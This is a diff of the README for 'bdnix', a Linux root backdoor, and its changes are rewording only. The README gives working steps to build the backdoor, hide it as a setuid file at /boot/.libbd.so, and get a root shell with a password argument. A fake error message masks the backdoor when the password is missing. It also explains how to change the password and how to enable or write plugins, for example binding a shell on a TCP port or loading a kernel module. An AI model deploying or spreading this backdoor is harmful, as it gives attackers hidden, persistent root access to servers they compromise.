@@ -14,18 +14,18 @@ Use it at your risk!
  GETTING STARTED
 ------------------
 
-1) Open root terminal in current directory and go into bdnix folder
-
-   # cd /path/bdnix
+1) Open root terminal in current directory and move to bdnix folder
+ 
+     # cd /path/bdnix
 
 2) From root run 'make' to build binary file
 
-   # make
-
+     # make
+   
 3) copy created file (i.e. libbd.so) with -p option to a hidden location like /bin, /etc,
 
-   # cp -p libbd.so /boot/.libbd.so
-   # chmod +sx /boot/.libbd.so
+     # cp -p libbd.so /boot/.libbd.so
+     # chmod +sx /boot/.libbd.so
         
    and setuid file (chmod +x).
 
@@ -33,108 +33,108 @@ Use it at your risk!
 4) logout from server and log in again with unprivileged user. 
 
 
-5) Run binary with joshua to enable backdoor
+5) Run binary with joshua argument to enable backdoor
 
-   $ /boot/.libbd.so joshua /bin/sh
+     $ /boot/.libbd.so joshua /bin/sh
+     #
 
-   if you see '#' then.. you are root! :)
+   You can see '#': you are root! :)
+ 
 
+6) Running without joshua password, you can read a (fake) error:
 
-6) if you run without joshua password, you can read a (fake) error:
-
-   /bin/sh: cannot execute binary file
+/bin/sh: cannot execute binary file
 
 
 ---------------------
  CUSTOMIZE PASSWORD
 ---------------------
 
-Opening settings.h you can change default password "joshua" (can you remember WOPR?):
+Open settings.h and replace default password "joshua"
 
-        #define ARG1 "joshua"
+  #define ARG1 "joshua"
 
-we can change it to "chips"
+with "chips"
 
-        #define ARG1 "chips"
+  #define ARG1 "chips"
 
-Now recompiling (read above) and running with new password:
+Now recompile backdoor with "make" and test it with new password:
 
-        $ /boot/.libbd.so chips /bin/sh
-        #
+$ /boot/.libbd.so chips /bin/sh
+#
 
-If we have rootshell, it works! :)
+it works! :)
 
 
-------------------
- ENABLE  PLUGINS
-------------------
-Plugins are .h file in plugins/ folders. By plugins you can add code portions and
-add new functionaties to bdnix (i.e. binding shell on TCP port, loading kernel module, etc).
+-----------------
+ ENABLE PLUGINS
+-----------------
+Plugins are .h file in plugins/ folder. Plugins permit to add code portions and
+extend bdnix feature (i.e. bind shell on TCP port, load kernel module, etc).
 To enable a plugin:
 
 1) Open settings.h include file and search for options like:
 
-        /* PLUGINS */
+  /* PLUGINS */
 
-        /* enable rootshell */
-        #define SHELL 1
-        
-2) Change 1 to enable, or 0 to disable code.
+  /* enable rootshell */
+  #define SHELL 1
+   
+2) Set 1 to enable, or 0 to disable code.
 
-Example. If you have rootshell disabled and myplugin enabled:
+Example: If you have rootshell disabled and myplugin enabled:
 
-        /* enable rootshell */
-        #define SHELL 0
-        
-        /* my plugin */
-        #define MYPLUGIN 1
-        
-Your backdoor run MYPLUGIN code and ignore rootshell. You can enable more plugins together: 
-all enabled plugins run in sequential mode. 
+  /* enable rootshell */
+  #define SHELL 0
 
-For adding or writing custom plugin, read WRITING A PLUGIN.
-
-
-------------------------
- WRITE A CUSTOM PLUGIN
-------------------------
-1) If you need write plugin, you must create .h file into plugin using next template:
-
-        int <PLUGIN_NAME>_init()
-        {
-          //code plugin
-        }
-
-   replacing <PLUGIN_NAME> with your plugin's name and write you code inside function. 
-
-2) Open bdcode.c and find this code into main():
-
-    #if SHELL == 1
-      shell_init(argv[2]);
-    #endif
+  /* my plugin */
+  #define MYPLUGIN 1
     
-   and edit previos code in this:
-   
-    #if SHELL == 1
-      shell_init(argv[2]);
+Your backdoor run MYPLUGIN code and ignore rootshell. You can enable more plugins together: 
+they will run in sequential mode. 
+
+For adding or writing custom plugin, read next paragraph.
+
+
+-----------------------
+ WRITE A CUSTOM PLUGIN
+-----------------------
+1) If you want write your plugin, you should create .h file into plugin using next template:
+
+    int PLUGIN_NAME_init()
+    {
+      //code plugin
+    }
+
+and replace PLUGIN_NAME with your plugin's name and write your code between {} in function.  
+
+2) Open bdcode.c and find this code portion into main():
+
+     #if SHELL == 1
+       shell_init(argv[2]);
+     #endif
+
+   and add some lines code:
+
+     #if SHELL == 1
+       shell_init(argv[2]);
+     #endif
+     #if PLUGIN_NAME == 1
+       PLUGIN_NAME_init();
+     #endif
+
+ don't forget to remove PLUGIN_NAME with your plugin's name.
+
+3) Before main(), add these lines:
+
+    #if PLUGIN_NAME == 1
+    #include "plugin/PLUGIN_NAME.h"
     #endif
-    #if <PLUGIN_NAME> == 1
-      <PLUGIN_NAME>_init();
-    #endif
-
-   removing <PLUGIN_NAME> with your plugin's name.
-   
- 3) Before main() function add these lines:
- 
-    #if <PLUGIN_NAME> == 1
-    #include "plugin/<PLUGIN_NAME>.h"
-    #endif
-
-    removing <PLUGIN_NAME> with your plugin's name.
-
-   TIPS EXAMPLE: You can start to write you plugin editing RAW plugin.
 
 
+and remove PLUGIN_NAME with your plugin's name.
+
+TIPS: you can edit RAW plugin.
 
 ----------
  LICENSE
